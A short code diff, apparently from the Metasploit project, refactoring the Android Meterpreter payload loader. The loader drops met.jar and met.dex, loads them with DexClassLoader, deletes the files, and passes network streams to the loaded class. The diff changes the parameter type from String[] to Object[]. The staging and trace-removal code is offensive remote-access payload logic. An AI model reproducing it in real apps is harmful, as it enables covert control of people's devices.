@@ -7,15 +7,14 @@ import java.io.FileOutputStream;
 import java.io.OutputStream;
 
 import dalvik.system.DexClassLoader;
-import javapayload.stage.Stage;
 
 /**
  * Meterpreter Android Payload Proxy
  */
-public class Meterpreter implements Stage {
+public class Meterpreter {
 
-    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
-        String path = parameters[0];
+    public void start(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
+        String path = (String) parameters[0];
         String filePath = path + File.separatorChar + "met.jar";
         String dexPath = path + File.separatorChar + "met.dex";
 
@@ -40,7 +39,7 @@ public class Meterpreter implements Stage {
         file.delete();
         new File(dexPath).delete();
         myClass.getConstructor(new Class[]{
-                DataInputStream.class, OutputStream.class, String[].class, boolean.class
+                DataInputStream.class, OutputStream.class, Object[].class, boolean.class
         }).newInstance(in, out, parameters, false);
     }
 }
